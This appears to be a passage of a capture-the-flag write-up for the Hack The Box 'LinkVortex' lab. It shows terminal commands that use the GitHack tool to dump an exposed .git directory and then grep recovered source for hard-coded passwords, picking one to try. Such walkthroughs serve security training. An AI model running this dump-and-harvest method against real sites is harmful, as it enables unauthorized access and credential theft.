git clone https://github.com/lijiejie/GitHack.git

```sh
┌──(kali㉿kali)-[~/exploits]
└─$ git clone https://github.com/lijiejie/GitHack.git
Cloning into 'GitHack'...
remote: Enumerating objects: 56, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 56 (delta 6), reused 18 (delta 6), pack-reused 34 (from 1)
Receiving objects: 100% (56/56), 17.10 KiB | 4.28 MiB/s, done.
Resolving deltas: 100% (14/14), done.
```

```sh
┌──(kali㉿kali)-[~/exploits/GitHack]
└─$ python3 GitHack.py         

A `.git` folder disclosure exploit. By LiJieJie

Usage: python GitHack.py http://www.target.com/.git/
```

```sh
┌──(kali㉿kali)-[~/exploits/GitHack/linkvortex]
└─$ python3 ../GitHack.py http://dev.linkvortex.htb/.git
[+] Download and parse index file ...
[+] .editorconfig
...
[File not found] ghost/core/test/regression/api/admin/__snapshots__/authentication.test.js.snap
[File not found] ghost/core/test/regression/api/admin/db.test.js
[OK] ghost/core/test/regression/api/admin/authentication.test.js
[File not found] ghost/core/test/regression/api/admin/identities.test.js
[File not found] ghost/core/test/regression/api/admin/images.test.js
...
```

all files in the directory:
```sh
┌──(kali㉿kali)-[~/exploits/GitHack/linkvortex]
└─$ find . -type f -exec ls -l {} \; 2> /dev/null                              
-rw-rw-r-- 1 kali kali 707577 Dec 20 02:18 ./index
-rw-rw-r-- 1 kali kali 20443 Dec 20 02:18 ./dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js
-rw-rw-r-- 1 kali kali 521 Dec 20 02:18 ./dev.linkvortex.htb/Dockerfile.ghost
```

This gives us a crazy much easier task that git-dumper!!

```sh
┌──(kali㉿kali)-[~/exploits/GitHack/linkvortex]
└─$ grep password ./dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js
            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
        it('reset password', async function () {
                password: ownerUser.get('password')
            await agent.put('authentication/password_reset')
                    password_reset: [{
        it('reset password: invalid token', async function () {
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: expired token', async function () {
                password: ownerUser.get('password')
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: unmatched token', async function () {
                password: 'invalid_password'
                .put('authentication/password_reset')
                    password_reset: [{
        it('reset password: generate reset token', async function () {
                .post('authentication/password_reset')
                    password_reset: [{
    describe('Reset all passwords', function () {
        it('reset all passwords returns 204', async function () {
            await agent.post('authentication/global_password_reset')
```

OctopiFociPilfer45 looks the most like a password, let's try it!